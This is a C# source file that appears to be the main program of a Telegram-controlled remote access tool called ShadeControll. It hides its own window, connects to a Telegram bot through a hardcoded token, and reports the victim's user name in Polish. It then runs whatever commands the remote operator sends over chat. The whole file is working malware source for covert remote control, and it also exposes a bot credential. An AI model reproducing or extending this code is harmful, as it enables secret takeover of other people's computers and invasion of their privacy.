using System;
using System.Threading;
using System.Collections.Generic;
using ShadeControll.Commands;
using Salaros.Configuration;
using System.IO;
using System.Globalization;

namespace ShadeControll
{
    class Program
    {
        public static TelegramClient telegramClient;
        public static ConfigParser configFile;

        static void Main()
        {
            Ninja.Hide();
            configFile = GetConfig("config.cfg");
            telegramClient = new TelegramClient("1774037430:AAHnjjeOUNvn-ZpyCCo_6mIhztp_GkagsVg");
            while(!telegramClient.Connect()) { Thread.Sleep(1000); }
            telegramClient.SendMessage("Połączono z Komputerem - " + Environment.UserName + "\n /help");
            telegramClient.NewMessage += Client_NewMessage;
            while (true) { Thread.Sleep(1000); }
        }

        private static void Client_NewMessage(string message)
        {
            Cmd _cmd = new Cmd(message);
            foreach(Command cmd in Command.AvailableCommands)
            {
                if(cmd.Name == _cmd.Name) { cmd.Execute(_cmd.Args); }
            }
        }

        private static ConfigParser GetConfig(string file)
        {
            if(File.Exists(file))
            {
                return new ConfigParser(file);
            }
            else
            {
                return new ConfigParser(@"
                [info]
                version=1.6
                ", new ConfigParserSettings {
                    MultiLineValues = MultiLineValues.Simple | MultiLineValues.AllowValuelessKeys | MultiLineValues.QuoteDelimitedValues,
                    Culture = new CultureInfo("en-US")
                });
            }
        }
    }
}
